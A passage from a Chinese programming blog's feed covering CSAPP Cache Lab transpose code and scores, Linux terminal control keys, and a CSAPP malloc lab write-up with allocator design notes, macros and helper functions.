<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i, j, a1, a2, a3, a4, a5, a6, a7, a8;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">56</span>; j += <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i) &#123;</span><br><span class="line">                a1 = A[i][j];</span><br><span class="line">                a2 = A[i][j+<span class="number">1</span>];</span><br><span class="line">                a3 = A[i][j+<span class="number">2</span>];</span><br><span class="line">                a4 = A[i][j+<span class="number">3</span>];</span><br><span class="line">                a5 = A[i][j+<span class="number">4</span>];</span><br><span class="line">                a6 = A[i][j+<span class="number">5</span>];</span><br><span class="line">                a7 = A[i][j+<span class="number">6</span>];</span><br><span class="line">                a8 = A[i][j+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                B[j][i] = a1;</span><br><span class="line">                B[j+<span class="number">1</span>][i] = a2;</span><br><span class="line">                B[j+<span class="number">2</span>][i] = a3;</span><br><span class="line">                B[j+<span class="number">3</span>][i] = a4;</span><br><span class="line">                B[j+<span class="number">4</span>][i] = a5;</span><br><span class="line">                B[j+<span class="number">5</span>][i] = a6;</span><br><span class="line">                B[j+<span class="number">6</span>][i] = a7;</span><br><span class="line">                B[j+<span class="number">7</span>][i] = a8;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">56</span>; j &lt; <span class="number">61</span>; ++j) &#123;</span><br><span class="line">                a1 = A[i][j];</span><br><span class="line">                B[j][i] = a1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">64</span>; i &lt; <span class="number">67</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">61</span>; ++j) &#123;</span><br><span class="line">                a1 = A[i][j];</span><br><span class="line">                B[j][i] = a1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="64-64">64 * 64</span></h4><p>对于64 * 64矩阵，每4行就有冲突，如使用8 * 8分块会导致块内就有冲突，只能得0分。</p>
<p>因此，这里改用4 * 4分块，再利用局部变量，代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1667 misses, 3.8 points</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i, j, l;</span><br><span class="line">        <span class="type">int</span> a1, a2, a3, a4, a5, a6, a7, a8;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; M; i += <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; N; j += <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(l = i; l &lt; i + <span class="number">4</span>; l += <span class="number">2</span>) &#123;</span><br><span class="line">                    a1 = A[l][j];</span><br><span class="line">                    a2 = A[l][j+<span class="number">1</span>];</span><br><span class="line">                    a3 = A[l][j+<span class="number">2</span>];</span><br><span class="line">                    a4 = A[l][j+<span class="number">3</span>];</span><br><span class="line">                    a5 = A[l+<span class="number">1</span>][j];</span><br><span class="line">                    a6 = A[l+<span class="number">1</span>][j+<span class="number">1</span>];</span><br><span class="line">                    a7 = A[l+<span class="number">1</span>][j+<span class="number">2</span>];</span><br><span class="line">                    a8 = A[l+<span class="number">1</span>][j+<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">                    B[j][l] = a1;</span><br><span class="line">                    B[j+<span class="number">1</span>][l] = a2;</span><br><span class="line">                    B[j+<span class="number">2</span>][l] = a3;</span><br><span class="line">                    B[j+<span class="number">3</span>][l] = a4;</span><br><span class="line">                    B[j][l+<span class="number">1</span>] = a5;</span><br><span class="line">                    B[j+<span class="number">1</span>][l+<span class="number">1</span>] = a6;</span><br><span class="line">                    B[j+<span class="number">2</span>][l+<span class="number">1</span>] = a7;</span><br><span class="line">                    B[j+<span class="number">3</span>][l+<span class="number">1</span>] = a8;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果为<code>1667</code>次，没有满分，原因是没有充分利用缓存。需要满分的可以参考：<a href="https://www.cnblogs.com/liqiuhao/p/8026100.html?utm_source=debugrun&utm_medium=referral">https://www.cnblogs.com/liqiuhao/p/8026100.html?utm_source&#x3D;debugrun&amp;utm_medium&#x3D;referral</a></p>
<h3><span id="实验结果">实验结果</span></h3><p>代码上传到github，仅供参考：<a href="https://github.com/PCJ600/CacheLab">https://github.com/PCJ600/CacheLab</a></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># ./driver.py</span><br><span class="line">Part A: Testing cache simulator</span><br><span class="line">Running ./test-csim</span><br><span class="line">                        Your simulator     Reference simulator</span><br><span class="line">Points (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts</span><br><span class="line">     3 (1,1,1)       9       8       6       9       8       6  traces/yi2.trace</span><br><span class="line">     3 (4,2,4)       4       5       2       4       5       2  traces/yi.trace</span><br><span class="line">     3 (2,1,4)       2       3       1       2       3       1  traces/dave.trace</span><br><span class="line">     3 (2,1,3)     167      71      67     167      71      67  traces/trans.trace</span><br><span class="line">     3 (2,2,3)     201      37      29     201      37      29  traces/trans.trace</span><br><span class="line">     3 (2,4,3)     212      26      10     212      26      10  traces/trans.trace</span><br><span class="line">     3 (5,1,5)     231       7       0     231       7       0  traces/trans.trace</span><br><span class="line">     6 (5,1,5)  265189   21775   21743  265189   21775   21743  traces/long.trace</span><br><span class="line">    27</span><br><span class="line"></span><br><span class="line">Part B: Testing transpose function</span><br><span class="line">Running ./test-trans -M 32 -N 32</span><br><span class="line">Running ./test-trans -M 64 -N 64</span><br><span class="line">Running ./test-trans -M 61 -N 67</span><br><span class="line"></span><br><span class="line">Cache Lab summary:</span><br><span class="line">                        Points   Max pts      Misses</span><br><span class="line">Csim correctness          27.0        27</span><br><span class="line">Trans perf 32x32           8.0         8         287</span><br><span class="line">Trans perf 64x64           3.8         8        1667</span><br><span class="line">Trans perf 61x67          10.0        10        1889</span><br><span class="line">          Total points    48.8        53</span><br></pre></td></tr></table></figure>

<h3><span id="参考资料">参考资料</span></h3><p>《深入理解计算机系统 原书第3版》</p>
<p><a href="https://zhuanlan.zhihu.com/p/142942823">CSAPP实验之cacheLab</a></p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux常见控制字符介绍</title>
    <url>/2020/0829191318.html</url>
    <content><![CDATA[<h2><span id="ctrl-c">ctrl + c</span></h2><p>中断键，给前台进程组中所有进程发送<code>SIGINT</code>信号，并终止进程。</p>
<h2><span id="ctrl-z">ctrl + z</span></h2><p>挂起键，给前台进程组中所有进程发送<code>SIGTSTP</code>信号,  并挂起进程。被挂起的进程并没有真正结束，可以使用<code>fg</code>或<code>bg</code>命令恢复被挂起的进程。</p>
<span id="more"></span>

<ul>
<li>fg —— 将后台作业放到前台终端运行。例如用VIM编辑文件时，需要敲shell命令。可以先用<code>Ctrl + Z</code>挂起VIM，敲完shell命令后再使用<code>fg</code>命令恢复VIM继续编辑，好处是不用退出VIM程序。</li>
<li>bg —— 恢复后台被挂起的作业，变成在后台继续执行。例如前台启动一个程序时，不希望一直等待程序运行结束，可以先用<code>Ctrl+Z</code>挂起进程，再使用<code>bg</code>命令后台恢复程序的执行，好处是不用终止程序。</li>
<li>jobs —— 显示当前shell中后台正在运行或被挂起的任务列表。</li>
</ul>
<h2><span id="ctrl-d">ctrl + d</span></h2><p>表示一个特殊二进制值<code>EOF</code>，表示已到达文件末尾(<code>end of file</code>), 可以用来快速退出终端。</p>
<h2><span id="ctrl-s">ctrl + s</span></h2><p>中断控制台的输出。有时终端卡死了，敲什么都没反应，很可能是敲了<code>Ctrl + S</code>，可以接着敲<code>Ctrl + q</code>恢复。</p>
<h2><span id="ctrl">ctrl + \</span></h2><p>终止进程，并向进程发送<code>SIGQUIT</code>信号，默认会产生<code>coredump</code>文件。</p>
<h2><span id="ctrl-l">ctrl + l</span></h2><p>清屏， 相当于终端里敲<code>clear</code>。</p>
<h2><span id="参考资料">参考资料</span></h2><p><a href="https://www.jianshu.com/p/730989a7302e">Linux常见信号大全</a></p>
<p><a href="https://blog.csdn.net/mylizh/article/details/38385739?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-7.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-7.channel_param">Linux中ctrl-c, ctrl-z, ctrl-d区别</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP malloc实验</title>
    <url>/2020/0926191511.html</url>
    <content><![CDATA[<h3><span id="实验简介">实验简介</span></h3><p>实现自己的动态内存分配器（<code>malloc</code>、<code>free</code>、<code>realloc</code>）。</p>
<h3><span id="预备知识">预备知识</span></h3><ul>
<li>阅读《CSAPP原书第3版》 9.9小节 —— 动态内存分配。</li>
<li>阅读<a href="http://csapp.cs.cmu.edu/3e/malloclab.pdf">writeup</a>的全部内容。</li>
</ul>
<span id="more"></span>

<h4><span id="分配器的设计要求">分配器的设计要求</span></h4><ul>
<li>处理任意请求序列，分配器不可以假设分配和释放请求的顺序。</li>
<li>立即响应请求, 不允许分配器为了提高性能重新排列或缓冲请求。</li>
<li>只使用堆。</li>
<li>对齐块，以保存任何类型的数据对象。</li>
<li>不修改已分配的块，分配器只能操作和改变空闲块。</li>
</ul>
<h4><span id="分配器的设计目标">分配器的设计目标</span></h4><ul>
<li>最大化吞吐率 —— 每个<code>malloc</code>, <code>free</code>执行的指令越少，吞吐率会越好。</li>
<li>最大化内存利用率。</li>
</ul>
<h4><span id="实现问题">实现问题</span></h4><p>关键是把握<strong>吞吐率</strong>和<strong>内存利用率</strong>之间的平衡。</p>
<ul>
<li>空闲块组织 —— 如何记录空闲块？</li>
<li>放置 —— 如何选一个合适的空闲块来放置一个新分配的块？ （首次适配&#x2F;下次适配&#x2F;最优适配）</li>
<li>分割 —— 将一个新分配块放到某个空闲块后，如何处理这个空闲块的剩余部分？</li>
<li>合并 —— 如何处理一个刚被释放的块？ （立即合并&#x2F;延迟合并）</li>
</ul>
<h3><span id="实验步骤">实验步骤</span></h3><p>代码下载：<a href="http://csapp.cs.cmu.edu/3e/malloclab-handout.tar">http://csapp.cs.cmu.edu/3e/malloclab-handout.tar</a></p>
<p>目标是实现<code>mm.c</code>中的如下函数, 原型如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">mm_malloc</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mm_free</span><span class="params">(<span class="type">void</span> *ptr)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">mm_realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure>

<p>这里使用两种方式实现<code>malloc</code>，分别如下：</p>
<ul>
<li>隐式空闲链表 + 首次适配&#x2F;下一次适配。</li>
<li>显示空闲链表 + 分离的空闲链表 +  分离适配。</li>
</ul>
<h3><span id="隐式空闲链表法">隐式空闲链表法</span></h3><p>原书9.9.6节详细介绍了隐式空闲链表法，并贴出了所有源代码。代码实现细节请参考原书或者 <a href="https://github.com/PCJ600/MallocLab/tree/br64">https://github.com/PCJ600/MallocLab/tree/br64</a></p>
<h5><span id="隐式空闲链表的形式如下">隐式空闲链表的形式如下：</span></h5><p><img data-src="/2020/0926191511/image1.png"></p>
<ul>
<li>每个堆块使用边界标记法。头部大小为4字节，前29位表示块大小，后3位表示这个块是否空闲；脚部(ftr)是头部(hdr)的副本。目的是<strong>将合并前面的堆块时的搜索时间降到常数</strong>。</li>
<li><strong>第1个填充字用于8字节对齐访问</strong>。考虑64位场景，如不添加填充字，heap_listp的值不能整除8，不满足对齐条件！</li>
<li>序言块和结尾块的设计是消除合并时边界条件的技巧。</li>
<li>按8字节对齐要求， 一个堆块最小为 4(头部) + 8(payload) + 4(脚部) &#x3D; 16字节</li>
<li>为什么是”隐式”的？——  因为空闲块是通过头部中大小字段隐含地连接着，从而间接遍历整个空闲块的集合。</li>
</ul>
<h4><span id="1-初始化堆-mm_init函数">1. 初始化堆 —— mm_init函数</span></h4><p><code>mm_init</code>步骤如下：</p>
<ul>
<li><p>首先在堆上分配16个字节，包括4字节对齐块，8字节序言块，4字节结尾块。</p>
</li>
<li><p>调<code>extend_heap</code>扩展堆，创建初始的空闲块，大小为4096字节。</p>
</li>
</ul>
<h4><span id="2-扩展堆-extend_heap函数">2. 扩展堆 —— extend_heap函数</span></h4><p>函数原型: <code>static void *extend_heap(size_t words);</code></p>
<p>以下两种场景需要扩展堆：</p>
<ul>
<li>调用<code>mm_init</code>初始化堆时。</li>
<li>调用<code>mm_malloc</code>找不到合适的空闲块时。</li>
</ul>
<p>举例：堆上扩展4096个字节，堆数组前后变化如下：</p>
<p><img data-src="/2020/0926191511/image2.png"></p>
<h4><span id="3-释放和合并块-mm_free和coalesce函数">3. 释放和合并块 —— mm_free和coalesce函数</span></h4><p>调用<code>mm_free</code>释放块，步骤如下：</p>
<ul>
<li><p>将当前块的头部和脚部中的分配位清零。</p>
</li>
<li><p>将这个块与它邻接的前后空闲块进行合并，采用立即合并策略。</p>
</li>
</ul>
<p>调用<code>coalesce</code>合并前后的合并块，原型：<code>static void *coalesce(void *bp);</code>，分四种情况：</p>
<ul>
<li>情况1：前面的块和后面的块都已分配 —— 不可能合并，简单返回bp即可。</li>
<li>情况2：前面的块已分配，后面的块空闲 —— 用当前块和后面块的大小之和更新当前块的头部和后面块的脚部。返回bp</li>
<li>情况3：前面的块是空闲的，后面的块是分配的 —— 用两块大小之和更新前面块的头部和后面块的脚部。返回<code>PREV_BLKP(bp)</code></li>
<li>情况4：前面和后面的块都是空闲的 —— 用三个块大小之和更新前面块的头部和后面块的脚部。返回<code>PREV_BLKP(bp)</code></li>
</ul>
<p>说的比较啰嗦，以下画图帮助理解：</p>
<p><strong>情况2:</strong> 前面的块已分配，后面的块空闲</p>
<p><img data-src="/2020/0926191511/image3.png"></p>
<p><strong>注意：</strong> <font color="red"><strong>如采用下次适配策略，在情况3、情况4合并后可能出现pre_listp指针不再指向一个块的payload段，报payload overlap错!</strong></font></p>
<p>因此必须更新<code>pre_listp</code>。这里简单将<code>pre_listp</code>指向合并后的新块的<code>payload</code>即可。</p>
<p><strong>情况3：</strong> 前面的块是空闲的，后面的块是分配的</p>
<p><img data-src="/2020/0926191511/image4.png"></p>
<p><strong>情况4：</strong> 前面和后面的块均空闲<br><img data-src="/2020/0926191511/image5.png"><br>[O#### 4. 分配块 —— mm_malloc</p>
<h5><span id="mm_malloc步骤">mm_malloc步骤</span></h5><ul>
<li><p>调整请求块的大小，需不低于16字节（8字节对齐要求），并舍入到8的整数倍。</p>
</li>
<li><p>根据请求块的大小，搜索空闲链表寻找合适的空闲块：</p>
<ul>
<li>如果找到合适的块，将请求块放置到这个合适的块中，并可选地分割这个块</li>
<li>如找不到合适的块，调<code>extend_heap</code>扩展堆，分配新的空闲块。将请求块放到这个新的空闲块里，并可选地分割这个块</li>
</ul>
</li>
</ul>
<h5><span id="适配算法">适配算法</span></h5><p>分配器搜索空闲块的方式由放置策略决定，常见策略有首次适配、下一次适配等。</p>
<ul>
<li><p>首次适配： 从头搜索空闲链表，选择第一个合适地空闲块。</p>
</li>
<li><p>下一次适配： 从上次查询结束的地方开始搜索空闲链表。</p>
</li>
</ul>
<h5><span id="分割策略">分割策略</span></h5><p>如分割后剩下的块不小于最小块大小(16字节)，才分割这个块。</p>
<p>设空闲块大小为M字节，<code>malloc</code>请求的块大小为N字节。只有M - N &gt;&#x3D; 16，才分割这个块。</p>
<p><img data-src="/2020/0926191511/image6.png"></p>
<h4><span id="5-实现mm_realloc">5. 实现mm_realloc</span></h4><p><code>mm_realloc</code>原型：<code>void *mm_realloc(void *ptr, size_t size)</code></p>
<p><a href="http://csapp.cs.cmu.edu/3e/malloclab.pdf">writeup</a>中提到了<code>mm_realloc</code>的所有实现要点，如下：</p>
<ul>
<li>如果ptr为NULL， 等价于调用mm_malloc</li>
<li>如果size为0, 等价于调用mm_free</li>
<li>如ptr不为NULL且size不为0， 参考realloc函数的实现： <code>man 3 realloc</code></li>
</ul>
<h4><span id="实验结果">实验结果</span></h4><p>执行<code>./mdriver -t traces/ -V</code>，查看详细结果：</p>
<p>首次适配: 44 (util) + 24 (thru) &#x3D; 68&#x2F;100</p>
<p>下一次适配：43 (util) + 40 (thru) &#x3D; 83&#x2F;100</p>
<h3><span id="分离空闲链表法">分离空闲链表法</span></h3><p>实现代码参考：<a href="https://github.com/PCJ600/MallocLab">https://github.com/PCJ600/MallocLab</a></p>
<p>使用分离的空闲链表，分配器会维护一个空闲链表的数组。每个空闲链表和一个大小类关联，被组织成某种类型的显式或隐式链表。笔者这里使用以下方案：</p>
<ul>
<li>链表结构为<strong>显式的双向链表</strong></li>
<li>大小类分为 {16-31},{32,63},{64,127}, …, {4096, 8191}, … 链表个数<code>MAX_LIST_NUM</code> 默认设置为20，可调整。</li>
<li>考虑兼容性，分配器需要在32位&#x2F;64位环境下都能正常运行。</li>
</ul>
<h4><span id="注意事项">注意事项</span></h4><ul>
<li>32位机器上，指针大小为4字节；64位机器上， 指针大小为8字节。可使用<code>sizeof(intptr_t)</code>表示指针大小, <code>intptr_t</code>类型是ISO C99定义的，可参考<code>/usr/include/stdint.h</code></li>
<li>实验要求不使用全局变量，可以将分离链表的头指针放到堆中。</li>
<li>默认Makefile采用<code>-m32</code>选项，64位环境下需要改成<code>-m64</code>。</li>
<li>实验涉及大量指针操作，编码极易出错。需掌握基本的gdb调试手段、并编写代码检查堆区和分离链表。</li>
</ul>
<h4><span id="显式的双向链表的堆块结构">显式的双向链表的堆块结构</span></h4><p><img data-src="/2020/0926191511/image7.png"></p>
<ul>
<li><p>对于空闲块，<code>pred</code>保存上一个空闲块的地址，<code>succ</code>保存下一个空闲块的地址。</p>
</li>
<li><p>使用双向链表结构，适配算法的时间复杂度从O(块总数)降到O(空闲块总数)。</p>
</li>
<li><p>不难得出：32位系统，块至少为16字节；64位系统，块至少为24字节。</p>
</li>
</ul>
<h3><span id="如何调试">如何调试？</span></h3><ul>
<li>设置编译选项<code>-g -O0</code>取消编译优化。</li>
<li>设置编译选项<code>-g3 -gdwarf-2</code>调试宏。</li>
<li>可以设置<code>-DDEBUG</code>宏，通过编译宏控制是否打印调试信息。</li>
<li>实现<code>mm_print</code>函数，在gdb中通过<code>call mm_print()</code>打印堆区和分离链表。</li>
</ul>
<h4><span id="打印堆数组状态和所有分离链表-mm_print函数设计">打印堆数组状态和所有分离链表 —— mm_print函数设计</span></h4><ul>
<li><p>打印堆数组中每个块的头部、脚部、大小、分配位、payload指针。</p>
</li>
<li><p>打印堆数组中所有分离链表头指针的值。</p>
</li>
<li><p>打印每条分离链表的所有块的头部、脚部、大小、分配位、payload指针。</p>
</li>
</ul>
<h4><span id="堆区和分离链表检查-mm_check函数设计">堆区和分离链表检查 —— mm_check函数设计</span></h4><p><strong>检查堆区状态，包括：</strong></p>
<ul>
<li>检查序言块、结尾块的指针、大小、分配位是否正确。</li>
<li>检查每个块的payload指针是否满足对齐要求。</li>
<li>检查每个块的payload指针是否在堆区的合法地址范围内(<code>mem_heap_lo() ~ mem_heap_hi()</code>之间)。</li>
<li>检查每个块的头部和脚部是否一致。</li>
<li>检查每个块的大小是否不低于最小块的大小，是否为4&#x2F;8字节的倍数。</li>
<li>采用立即合并策略时，检查不存在任意两个相邻的空闲块。</li>
</ul>
<p><strong>检查分离链表状态，包括：</strong></p>
<ul>
<li><p>检查链表中所有指针是否在堆区的合法地址范围内。</p>
</li>
<li><p>检查双向链表实现是否正确，是否每个指针A的后继为B时，B的前驱也同时为A。</p>
</li>
<li><p>检查分离链表中所有的空闲块是否与堆数组的空闲块中找到并匹配。</p>
</li>
<li><p>检查堆数组中每个空闲块是否都能在分离链表中找到并匹配。</p>
</li>
<li><p>检查堆数组中每个已占用块是否都不在分离链表中。</p>
</li>
</ul>
<p><strong>针对malloc做如下检查：</strong></p>
<ul>
<li>malloc返回前，检查指针p是否在堆数组中，如不在堆数组中说明出错。</li>
<li>malloc返回前，检查指针p对应的块大小是否不小于malloc请求的大小。</li>
</ul>
<p><strong>针对free做如下检查：</strong></p>
<ul>
<li><p>调用free时，先检查指针p是否在堆区的合法地址范围内。</p>
</li>
<li><p>调用free时，先检查p是否指向了堆数组中某个已分配块。</p>
</li>
</ul>
<p>实现代码参考： <a href="https://github.com/PCJ600/MallocLab/blob/master/mm.c">https://github.com/PCJ600/MallocLab/blob/master/mm.c</a>  <code>mm_check</code>函数</p>
<h4><span id="指针运算-宏定义">指针运算、宏定义</span></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGNMENT (sizeof(size_t))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGN(size) (((size) + (ALIGNMENT-1)) &amp; ~(ALIGNMENT-1))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WSIZE 4                                     <span class="comment">// 4字节</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DSIZE 8                                     <span class="comment">// 双字: 8字节</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZE (1 &lt;&lt; 12)                         <span class="comment">// 4096字节, 执行extend_heap一次, 堆上扩展的大小</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACK(size, alloc)  ((size) | (alloc))		<span class="comment">// 设置分配位， 前29位表示块大小，后3位表示是否已分配</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET(p)             (*(unsigned int *)(p))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT(p, val)        (*(unsigned int *)(p) = (val))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SIZE(p)        (GET(p) &amp; ~(0x1))        <span class="comment">// 获取块大小, 这里块大小不会超过2^32字节</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_ALLOC(p)       (GET(p) &amp; 0x1)           <span class="comment">// 判断这个块是否已分配</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指针类型读写，使用intptr_t兼容32位/64位机器</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_P(p)           (*(intptr_t *)(p))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT_P(p, val)      (*(intptr_t *)(p) = (intptr_t)(val))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 分离链表: |(16-31)|(32-63)|(64-127)|(128-255)| ..... |(2^23,2^24-1)|，这里设置20条链表</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_LIST_NUM 20                                 <span class="comment">// 分离链表最大数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_INDEX 4                                     <span class="comment">// 最小块为16字节, 即2^4。这里MIN_INDEX表示分离链表中第一条链表的最小块大小</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_BLOCK_SIZE (DSIZE + 2 * sizeof(intptr_t))	<span class="comment">// 块大小的最小值，32位为16字节， 64位为24字节</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTR(bp)     ((char *)(bp))						<span class="comment">// 强转成char *类型指针</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HDRP(bp)    ((char *)(bp) - WSIZE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FTRP(bp)    ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV(bp)    ((char *)(bp))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCC(bp)    ((char *)(bp) + sizeof(intptr_t))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_PREV(bp) ((char *)(GET_P(PREV(bp))))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SUCC(bp) ((char *)(GET_P(SUCC(bp))))</span></span><br></pre></td></tr></table></figure>

<h4><span id="辅助函数设计">辅助函数设计</span></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">insert_node</span><span class="params">(<span class="type">void</span> *p, <span class="type">size_t</span> size)</span>; <span class="comment">/* 将大小为size的空闲块插入分离空闲链表 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">delete_node</span><span class="params">(<span class="type">void</span> *p)</span>; 			   <span class="comment">/* 从分离链表中删除指定块 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *p)</span>; 			   <span class="comment">/* 合并空闲块 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">place</span><span class="params">(<span class="type">void</span> *p, <span class="type">size_t</span> size)</span>;  	   <span class="comment">/* 放置大小为size的块到p指向的空闲块 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> size)</span>;         <span class="comment">/* 扩展堆 */</span></span><br><span class="line"><span class="comment">/* 在所有分离链表中找合适空闲块，返回空闲块指针 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">find_free_block</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="comment">/* 将p指向的块插入第idx个分离链表 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">insert_node_by_list_index</span><span class="params">(<span class="type">void</span> *p, <span class="type">size_t</span> size, <span class="type">int</span> idx)</span>;</span><br><span class="line"><span class="comment">/* 移除第i条分离链表上的节点p; 如p不在链表中，则删除失败返回false,否则返回true */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">delete_node_by_list_index</span><span class="params">(<span class="type">void</span> *p, <span class="type">int</span> size, <span class="type">int</span> idx)</span>;</span><br></pre></td></tr></table></figure>

<h5><span id="insert_node">insert_node</span></h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">insert_node</span><span class="params">(<span class="type">void</span> *p, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="type">int</span> list_size;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_LIST_NUM; ++i) &#123;</span><br><span class="line">        list_size = (<span class="number">1</span> &lt;&lt; (MIN_INDEX + i));</span><br><span class="line">        <span class="keyword">if</span> (size &gt; list_size) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        insert_node_by_list_index(p, size, i);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5><span id="delete_node">delete_node</span></h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">delete_node</span><span class="params">(<span class="type">void</span> *p)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> list_size;</span><br><span class="line">    <span class="type">int</span> size = GET_SIZE(HDRP(p));</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_LIST_NUM; ++i) &#123;</span><br><span class="line">        list_size = (<span class="number">1</span> &lt;&lt; (MIN_INDEX + i));</span><br><span class="line">        <span class="keyword">if</span> (size &lt;= list_size) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 查找每条分离链表，尝试从链表中删除p</span></span><br><span class="line">    <span class="keyword">for</span> ( ; i &lt; MAX_LIST_NUM; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (delete_node_by_list_index(p, size, i)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    